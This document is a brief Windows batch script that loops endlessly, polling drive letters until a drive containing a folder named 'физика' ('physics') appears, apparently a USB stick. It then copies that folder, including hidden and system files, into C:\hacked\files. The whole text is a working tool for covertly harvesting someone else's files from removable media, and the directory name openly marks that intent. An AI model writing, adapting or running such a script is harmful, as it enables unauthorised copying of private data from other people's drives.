set path=C:\Windows\system32;C:\Windows%path%
chcp 1251

:start
for %%i in (C D E F G H I J K L M N O P Q R S T U V W X Y Z) do if exist %%i:\физика set flash=%%i:

IF DEFINED flash (
  MD C:\hacked\files
  xcopy %flash%\физика C:\hacked\files /H /E /G /Q /R /Y
  pause
) ELSE (
  ping -n 5 127.0.0.1 >NUL:
  goto :start
)